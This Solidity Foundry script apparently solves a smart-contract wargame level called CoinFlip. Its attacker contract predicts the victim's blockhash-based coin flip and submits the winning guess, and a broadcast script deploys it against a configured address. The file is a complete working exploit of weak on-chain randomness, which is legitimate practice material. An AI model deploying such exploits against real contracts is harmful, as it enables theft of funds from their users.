// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";
// import "forge-std/utils/Strings.sol";

import {Constants} from "./Constants.s.sol";

interface ICoinFlip {
    function consecutiveWins() external returns (uint256);
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip victim) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
}


contract CoinFlipAttacker is Constants, Script {
    function run() public {
        ICoinFlip victim = ICoinFlip(COIN_FLIP_ADDRESS);

        vm.startBroadcast();
        new CoinFlipAttack(victim);
        vm.stopBroadcast();
    }
}